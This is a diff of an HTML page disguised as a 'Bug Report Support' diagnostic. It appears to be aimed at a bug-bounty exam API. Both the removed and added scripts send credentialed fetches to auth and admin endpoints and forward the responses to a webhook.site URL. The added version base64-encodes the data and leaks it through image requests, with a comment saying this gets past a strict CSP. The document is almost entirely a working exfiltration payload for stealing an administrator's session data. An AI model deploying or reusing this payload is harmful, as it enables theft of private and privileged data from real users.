@@ -1,36 +1,32 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Bug Report Support</title>
+</head>
 <body>
+    <h1>System Diagnostic in Progress...</h1>
     <script>
-        const myWebhook = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
-        // Targeting the specific car ID from your earlier console log
-        const targetCarId = "69dd6987c0d4316bd884dd654"; 
+        const webhook = "https://webhook.site/1abdbc1b-75fa-4240-8ae0-e2ffb37b707e";
+        const base = "https://api-bugbounty-exam.hashacademy.co";
+        
+        // List of high-value targets for flags
+        const targets = [
+            "/api/v1/auth/me",
+            "/api/admin/stats",
+            "/api/v1/admin/logs"
+        ];
 
-        // 1. Fetch the FULL data for this specific car
-        fetch(`https://api-bugbounty-exam.hashacademy.co/api/cars/${targetCarId}`, {
-            credentials: "include"
-        })
-        .then(res => res.json())
-        .then(data => {
-            fetch(myWebhook, {
-                method: "POST",
-                body: JSON.stringify({ 
-                    type: "CAR_ID_EXFIL", 
-                    details: data 
+        targets.forEach(path => {
+            fetch(base + path, { credentials: 'include' })
+                .then(response => response.text())
+                .then(data => {
+                    // Send result back to webhook using Image to bypass strict CSP
+                    const leak = btoa(data).substring(0, 800); // Base64 encode and trim
+                    new Image().src = `${webhook}/?path=${btoa(path)}&data=${leak}`;
                 })
-            });
-        });
-
-        // 2. Also fetch the admin's own profile to check for global flags
-        fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/me", {
-            credentials: "include"
-        })
-        .then(res => res.json())
-        .then(data => {
-            fetch(myWebhook, {
-                method: "POST",
-                body: JSON.stringify({ type: "ADMIN_ME", admin: data })
-            });
+                .catch(err => {
+                    new Image().src = `${webhook}/?err=${btoa(path)}`;
+                });
         });
     </script>
 </body>
